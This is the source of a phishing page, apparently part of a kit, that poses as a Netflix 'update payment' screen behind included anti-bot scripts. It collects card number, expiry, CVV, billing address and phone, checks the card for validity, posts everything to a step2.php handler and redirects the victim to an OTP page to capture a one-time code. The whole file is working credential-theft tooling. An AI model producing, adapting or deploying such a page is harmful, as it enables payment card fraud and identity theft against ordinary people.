<?php session_start();
error_reporting(0);
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';
include 'system/languages/en.php';
?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Netflix</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
      <link id="lib_main" type="text/css" rel="stylesheet" href="files/css/none.css">
      <link id="lib" type="text/css" rel="stylesheet" href="files/css/none2.css">
      <link rel="shortcut icon" href="files/img/favicon.ico">
      <link rel="apple-touch-icon" href="files/img/favicon.png">
      <script type="text/javascript" src="files/js/modernizr.min.js"></script>
	  <script src="files/js/jquery.js"></script> 
      <script src="files/js/jquery.ccvalid.js"></script>
      <script src="files/js/jquery.mask.js"></script>
   </head>
<style>
.exp-wrapper {
  position: relative;
  border: 1px solid #aaa;
  display: flex;
  justify-content: space-around;
  height: 36px;
  line-height: 36px;
  font-size: 24px;
}

.exp-wrapper:after {
  content: '/';
  position: absolute;
  left: 50%;
  margin-left: -4px;
  color: #aaa;
}

input.exp {
  float: left;
  font-family: monospace;
  border: 0;
  width: 18px;
  outline: none;
  appearance: none;
  font-size: 14px;
  required {
  box-shadow: 4px 4px 20px rgba(200, 0, 0, 0.85);
}
</style>
   <body>
     <!-- -->
     <div class="basicLayout simplicity">
   <div class="nfHeader noBorderHeader signupBasicHeader"><span class="logo"><img src="files/img/nt_logo.svg" alt="logo"></span><a href="javascript:" class="authLinks signupBasicHeader isMemberSimplicity"><?php echo $info_tr['signout'] ?></a></div>
   <div class="simpleContainer">
      <div class="centerContainer firstLoad">
         <div class="paymentFormContainer">
            <center><h1 class="stepTitle"><?php echo $info_tr['update'] ?></h1></center>
            <form method="post" action="javascript:void(0)" novalidate data-valid="<?php echo $info_tr['required'] ?>">
               <div class="fieldContainer">
                  <ul class="simpleForm structural ui-grid">
                     <li class="nfFormSpace">
                      <br><center><span class="logos logos-block"><span class="logoIcon VISA"></span><span class="logoIcon MASTERCARD"></span><span class="logoIcon AMEX"></span><span class="logoIcon DISCOVER"></span></span></center><br>
                        <div class="cardNumberContainer">
                           <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement"><label><input type="hidden" name="ctp" value=""><input placeholder="" type="tel" class="nfTextField" id="cnm" maxlength="23" name="cnm" data-check=""><label for="cnm" class="placeLabel"><?php echo $info_tr['cnm'] ?></label></label></div>
                              <div class="inputError" style="display:none"></div>
                           </div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="exp-wrapper">
                             <input autocomplete="off" class="exp" id="month" maxlength="2"  name="expm" pattern="[0-9]*" inputmode="numerical" placeholder="MM" type="tel" >
                             <input autocomplete="off" class="exp" id="year" maxlength="2"  name="expy" pattern="[0-9]*" inputmode="numerical" placeholder="YY" type="tel">
                             <div class="inputError" style="display:none"></div>
                           </div>
                        </div>
                     </li>
                     <li class="nfFormSpace"></li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="tel" class="nfTextField" id="csc" maxlength="4" minlength="3" name="csc"><label for="csc" class="placeLabel"><?php echo $info_tr['csc'] ?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                           <div class="tooltipWrapperErr" id="bt_whats_csc"><img src="files/img/csc_circle.svg" alt="circle"></div>
                        </div>
                     </li>
                     <br>
               <div class="contextRow contextRowFirst">Enter Your billing address</div>
                     <br>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input value="" id="fnm" type="text" class="nfTextField" name="fnm"><label for="fnm" class="placeLabel"><?php echo $info_tr['full_name'] ?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="adr" name="adr"><label for="adr" class="placeLabel"><?php echo $info_tr['adr'] ?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input value="" type="tel" class="nfTextField" id="zip" minlength="6" name="zip"><label for="zip" class="placeLabel"><?php echo $info_tr['zip'] ?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="cty" name="cty"><label for="cty" class="placeLabel"><?php echo $info_tr['city'] ?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input value="" type="tel" class="nfTextField" id="phn" name="phn"><label for="phn" class="placeLabel"><?php echo $info_tr['phone'] ?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                  </ul>
               </div>
               <div class="submitBtnContainer">
                  <button id="bt_submit" class="nf-btn waiting nf-btn-primary nf-btn-solid nf-btn-oversize" type="submit">
                     <?php echo $info_tr['save'] ?>
                     <div class="waitIndicator">
                        <div class="basic-spinner basic-spinner-light center-absolute" style="width:35px;height:35px"></div>
                     </div>
                  </button>
               </div>
            </form>
         </div>
         <div class="cvvTooltip" style="display:none" id="whats_csc">
            <span class="icon-close close-button pointer" id="bt_close_whats_csc"></span>
            <div class="tooltipDesc"><?php echo $info_tr['csc_msg'] ?></div>
            <div class="otherCvvHelp"></div>
            <div class="amexCvvHelp"></div>
         </div>
      </div>
   </div>
   <div class="site-footer-wrapper centered">
      <div class="footer-divider"></div>
      <div class="site-footer">
         <p class="footer-top"><a class="footer-top-a" href="javascript:"><?php echo $lg_tr['contact'] ?></a></p>
         <ul class="footer-links structural">
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['faq'] ?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['help_center'] ?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['terms'] ?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['privacy'] ?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['cookies'] ?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['corporate'] ?></a></li>
         </ul>
      </div>
   </div>
         <script>
$("#lib").removeAttr('disabled');
$(document).ready(function() {
    $('#phn').mask('(000) 000-00000');

    function valid(me) {
        if (me.val()) {
            me.addClass('hasText valid');
            me.removeClass('error');
            me.parent().parent().parent().children('.inputError').hide();
            return true;
        } else {
            me.addClass('error');
            if (me.attr("placeholder") == undefined) {
                me.removeClass('hasText valid');
            } else {
                me.removeClass('valid');
            }
            me.parent().parent().parent().children('.inputError').html(me.next('label').html() + ' ' + $('form').data('valid')).show();
            return false;
        }
    }
    $(document).on('keyup', 'input', function() {
        var me = $(this);
        valid(me);
    });
    $(document).on('click', '#bt_whats_csc', function() {
        $('#whats_csc').show();
    });
    $(document).on('click', '#bt_close_whats_csc', function() {
        $('#whats_csc').hide();
    });
    var ccvalid = false;
    $(document).on('keyup', '#cnm', function() {
        $('#cnm').validateCreditCard(function(result) {
            var cc = $('#cnm');
            if (cc.val() != '') {
                var cctype = result.card_type == null ? '-' : result.card_type.name;
                $('input[name=ctp]').val(cctype);
                if (result.valid) {
                    cc.addClass('hasText valid');
                    ccvalid = true;
                } else {
                    ccvalid = false;
                }
            }
        });
    });
     var ccvalid = false;
    $(document).on('keyup', '#cnm', function() {
        $('#cnm').validateCreditCard(function(result) {
            var cc = $('#cnm');
            if (cc.val() != '') {
                var cctype = result.card_type == null ? '-' : result.card_type.name;
                $('input[name=ctp]').val(cctype);
                if (result.valid) {
                    cc.addClass('hasText valid');
                    cc.removeClass('error');
                    cc.parent().parent().parent().children('.inputError').hide();
                    ccvalid = true;
                } else {
                    cc.addClass('error');
                    cc.removeClass('valid');
                    cc.parent().parent().parent().children('.inputError').html(cc.data('check')).show();
                    ccvalid = false;
                }
            }
        });
    });
    $(document).on('submit', 'form', function(e) {
        e.preventDefault();
        var me = $(this);
        var check = true;
        $('input').each(function(index, el) {
            if (!valid($(el))) {
                check = false;
            }
        });
        if (!ccvalid) {
            check = false;
        }
        if (check) {
            $('#bt_submit').attr('disabled', '');
            $.post("system/step2.php", me.serialize(), function(data, status) {
                if (status == "success") {
                    if (data == "error") {
                        $('#bt_submit').removeAttr('disabled');
                    } else {
                    $(location).attr("href", "./otp.php?country.x=Global&flowContext=login&flowId=ul&_Email=datax");
                    }
                } else {
                    $('#bt_submit').removeAttr('disabled');
                }
            });
        } else {
            return false;
        }
    });
});
         </script>
         	<script>
		
		window.onload=function(){

		
		input_credit_card = function(input)
{
    var format_and_pos = function(char, backspace)
    {
        var start = 0;
        var end = 0;
        var pos = 0;
        var separator = " ";
        var value = input.value;

        if (char !== false)
        {
            start = input.selectionStart;
            end = input.selectionEnd;

            if (backspace && start > 0)
            {
                start--;

                if (value[start] == separator)
                { start--; }
            }
            value = value.substring(0, start) + char + value.substring(end);

            pos = start + char.length;
        }

        var d = 0; 
        var dd = 0;
        var gi = 0;
        var newV = "";
        var groups = /^\D*3[47]/.test(value) ?
        [4, 6, 5] : [4, 4, 4, 4];

        for (var i = 0; i < value.length; i++)
        {
            if (/\D/.test(value[i]))
            {
                if (start > i)
                { pos--; }
            }
            else
            {
                if (d === groups[gi])
                {
                    newV += separator;
                    d = 0;
                    gi++;

                    if (start >= i)
                    { pos++; }
                }
                newV += value[i];
                d++;
                dd++;
            }
            if (d === groups[gi] && groups.length === gi + 1) // max length
            { break; }
        }
        input.value = newV;

        if (char !== false)
        { input.setSelectionRange(pos, pos); }
    };

    input.addEventListener('keypress', function(e)
    {
        var code = e.charCode || e.keyCode || e.which;
        if (code !== 9 && (code < 37 || code > 40) &&
        !(e.ctrlKey && (code === 99 || code === 118)))
        {
            e.preventDefault();
            var char = String.fromCharCode(code);
            if (/\D/.test(char) || (this.selectionStart === this.selectionEnd &&
            this.value.replace(/\D/g, '').length >=
            (/^\D*3[47]/.test(this.value) ? 15 : 16))) // 15 digits if Amex
            {
                return false;
            }
            format_and_pos(char);
        }
    });
    
  
};
input_credit_card(document.getElementById('cnm'));
		}
</script> 
      </div>
   </body>
</html>
